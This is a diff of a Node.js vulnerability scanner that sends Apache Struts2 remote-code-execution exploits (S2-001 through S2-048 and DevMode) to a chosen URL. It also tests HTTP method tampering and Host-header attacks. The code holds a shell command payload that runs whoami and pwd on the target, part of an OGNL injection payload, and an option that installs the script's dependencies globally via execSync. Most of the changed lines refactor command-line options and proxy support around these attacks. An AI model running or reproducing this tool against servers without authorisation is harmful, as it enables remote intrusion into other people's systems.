@@ -1,4 +1,5 @@
-var szMyName = 'M.T.X._2017-06-08',
+var szMyName = 'M.T.X._2017-06-08 1.0',
+	program     = require('commander'),
 	request = require('request'),
 	urlObj = require('url'),
 	child_process = require("child_process"),
@@ -6,11 +7,10 @@ var szMyName = 'M.T.X._2017-06-08',
 	crypto = require('crypto'),
 	path        = require("path"),
 	fs = require('fs'),
-	url = "",bReDo = false, szLstLocation = "",
+	g_szUrl = "",bReDo = false, szLstLocation = "",
 	g_oRst = {},
 	timeout = 15000,
 	iconv = require("iconv-lite"),
-	a = process.argv.splice(2),
 	bRunHost = false,
 	g_szUa = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
 	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
@@ -44,11 +44,51 @@ var szMyName = 'M.T.X._2017-06-08',
 		+ ".(#ros.flush()).(#ros.close())}"
 		;
 
-if(0 < a.length)url = a[0];
+
 process.stdin.setEncoding('utf8');
 process.env.NODE_ENV = "production";
 
+program.version(szMyName)
+	.option('-u, --url [value]', 'check url, no default')
+	.option('-p, --proxy [value]', 'http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default')
+	.option('-t, --t3', 'check weblogic t3,default false')
+	.option('-i, --install', 'install node modules')
+	.option('-m, --menu [value]', 'scan url + menus, default ./urls/ta3menu.txt')
+	.option('-d, --method [value]', 'default PUT,DELETE,OPTIONS,HEAD,PATCH test')
+	.option('-a, --host ', 'host attack test,设置代理后该项功能可能无法使用,default true')
+	.option('-k, --keys [value]', 'scan html keywords, default ./urls/keywords')
+	.parse(process.argv);
+// 检查对象
+var a = process.argv.splice(2)
+g_szUrl = program.url || 1 == a.length && a[0];
+if(!/[\?;!&]/.test(g_szUrl))
+	g_szUrl += "/";
+// 安装包
+if(program.install)
+{
+	var aI,szT = fs.readFileSync(__filename),r1 = /^(net|commander|fs|child_process)$/gmi,
+		r2 = /require\(['"]([^'"]+)['"]\)/gmi;
+	while(aI = r2.exec(szT))
+	{
+		if(r1.exec(aI[1]))continue;
+		// console.log(r1.exec(aI[1]));
+		console.log("start install %s to global",aI[1]);
+		console.log(child_process.execSync("npm install -g " + aI[1]).toString());
+	}
+	process.exit(0);
+}
 
+// 代理设置
+if(program.proxy)
+{
+	request = request.defaults({'proxy': program.proxy});
+	var a1 = program.proxy.split(/:\/\//g)
+	if(a1 && 2 == a1.length)
+	{
+		process.env[a1[0].toLowerCase() + "_proxy"] = program.proxy;
+		try{require('global-tunnel').initialize()}catch(e){}
+	}
+}
 function fnOptHeader(o)
 {
 	var k = {followAllRedirects:false,followRedirect:false,"timeout":timeout};
@@ -160,7 +200,7 @@ function fnTest(s)
 {
 	request(
 	    fnOptHeader({ method: s ||'PUT'
-	    ,uri: url//.substr(0,url.lastIndexOf("/"))
+	    ,"uri": g_szUrl//.substr(0,url.lastIndexOf("/"))
 	    ,headers:{'Access-Control-Request-Method':'GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH'}
 	    , multipart:'HEAD' == s|| 'OPTIONS' == s? null:
 	      [ { 'content-type': 'application/json'
@@ -188,7 +228,8 @@ function fnTest(s)
 	      		g_oRst["location"] = "建议在服务器端跳转 " + response.headers["location"];
 	      		if(szLstLocation != response.headers["location"])
 	      		{
-	      			szLstLocation = url = response.headers["location"];
+	      			// url
+	      			szLstLocation = response.headers["location"];
 	      			fnTestAll();
 	      		}
 	      	}
@@ -523,11 +564,12 @@ function doStruts2_029(url, fnCbk)
 // 测试所有，便于更改url重复测试
 function fnTestAll()
 {
-	fnDoHostAttack(url,function(o)
+	if(!program.proxy && false !== program.host)
+	fnDoHostAttack(g_szUrl,function(o)
 	{
 		console.log(o);
 	},null);
-	var aMethod = ["PUT","DELETE","OPTIONS","HEAD", "PATCH"];
+	var aMethod = (program.method || "PUT,DELETE,OPTIONS,HEAD,PATCH").split(/[,;]/);
 	for(var k in aMethod)
 		fnTest(aMethod[k]);
 }
@@ -555,6 +597,8 @@ function fnCheckJavaFx(s)
 	});
 	
 }
+// 缓存正则表达式，便于提高效率
+var g_reKeys = null;
 
 function fnCheckKeys(b)
 {
@@ -575,10 +619,11 @@ function fnCheckKeys(b)
 		if(0 < r.length)g_oRst.checkKeys.passwordInputs = {"des":"密码字段应该添加autocomplete=off",list:r};
 	}
 	oMp = {};
-	if(!g_oRst.checkKeys.keys)
+	s = program.keys || "./urls/keywords";
+	if(!g_oRst.checkKeys.keys && fs.existsSync(s))
 	{
-		s = __dirname + "/urls/keywords";
-		a = new RegExp("(" + String(fs.readFileSync(s)).trim().replace(/\n/gmi,"|") + ")=","gmi");
+		a = g_reKeys || new RegExp("(" + String(fs.readFileSync(s)).trim().replace(/\n/gmi,"|") + ")=","gmi");
+		g_reKeys = a;
 		re = [];
 		while(s = a.exec(b))
 		{
@@ -608,9 +653,9 @@ function fnGetErrMsg(body)
 		}catch(e)
 		{
 			var bHv = false;
-			i = body.indexOf("at com.yinhai.");
+			i = body.indexOf("at com.");
 			if(bHv = -1 < i)body = body.substr(i - 11);
-			i = body.indexOf("at org.springframework.web.filter.DelegatingFilterProxy.doFilter");
+			i = body.lastIndexOf("at ");
 			if(-1 < i)bHv = true,body = body.substr(0,i);
 			if(bHv)return body;
 		}
@@ -627,7 +672,7 @@ function fnCheckTa3(u)
 	var j = u.lastIndexOf('/');
 	if(10 < j)u = u.substr(0, j + 1);
 	else u += '/';
-	var s = __dirname + "/urls/ta3menu.txt",a,i = 0,fnCbk = function(url)
+	var s = program.menu || "./urls/ta3menu.txt",a,i = 0,fnCbk = function(url)
 	{
 		request(fnOptHeader({method: 'GET',uri: u + url
 		    ,headers:
@@ -667,8 +712,7 @@ function fnCheckTa3(u)
 			// console.log(a[i]);
 			fnCbk(a[i]);
 		}
-	}
-	
+	}else console.log("不存在: " + s);
 }
 // 全部编码为%xx格式
 function fnMakeData(s)
@@ -697,20 +741,21 @@ request.post(//  + encodeURIComponent(g_postData)
 if(0 < a.length)
 {
 	//*
-	fnCheckTa3(url);
-	doStruts2_001(url);
-	doStruts2_016(url);
-	doStruts2_019(url);
-	doStruts2_029(url);
-	doStruts2_032(url);
-	doStruts2_033(url);
-	doStruts2_037(url);
-	doStruts2_045(url);
+	if(program.proxy)fnCheckTa3(g_szUrl);
+	doStruts2_001(g_szUrl);
+	doStruts2_016(g_szUrl);
+	doStruts2_019(g_szUrl);
+	doStruts2_029(g_szUrl);
+	doStruts2_032(g_szUrl);
+	doStruts2_033(g_szUrl);
+	doStruts2_037(g_szUrl);
+	doStruts2_045(g_szUrl);
 	// 文件上传测试
 	// doStruts2_046(url);
-	doStruts2_048(url);
-	doStruts2_DevMode(url);
+	doStruts2_048(g_szUrl);
+	doStruts2_DevMode(g_szUrl);
 	
+	// 测试method和伪造host
 	fnTestAll();
 	////////////////////*/
 }
